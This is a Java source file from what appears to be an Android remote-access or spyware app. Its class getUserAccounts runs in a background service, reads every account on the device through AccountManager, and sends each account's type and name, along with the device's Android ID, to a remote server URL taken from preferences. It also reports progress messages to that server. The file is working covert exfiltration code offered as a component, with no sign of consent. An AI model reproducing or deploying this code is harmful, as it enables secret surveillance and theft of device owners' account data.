package u.can.i.up.expert.utils;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class getUserAccounts extends AsyncTask<String, Void, String> {
    String j = "";
    public getUserAccounts(String j) {
        this.j = j;
    }
    @Override
    protected String doInBackground(String... params) {
        AccountManager am = AccountManager.get(DataSet.getInstance().myService.getApplicationContext());
        Account[] accounts = am.getAccounts();
        ArrayList<String> googleAccounts = new ArrayList<String>();
        int i = 0;
        for (Account ac : accounts) {
            if(i<Integer.parseInt(j))
            {
                String acname = ac.name;
                String actype = ac.type;
                googleAccounts.add(ac.name);

                try {
                    Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "[" + actype + "] " + acname );
                } catch (UnsupportedEncodingException e) {

                    e.printStackTrace();
                }
            }
            i++;
        }

        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Get",false).commit();
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "User Accounts Complete");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
    }
    @Override
    protected void onPreExecute() {
        while(PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getBoolean("Get",false) == true)
        {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Getting User Accounts");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Get",true).commit();
    }
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
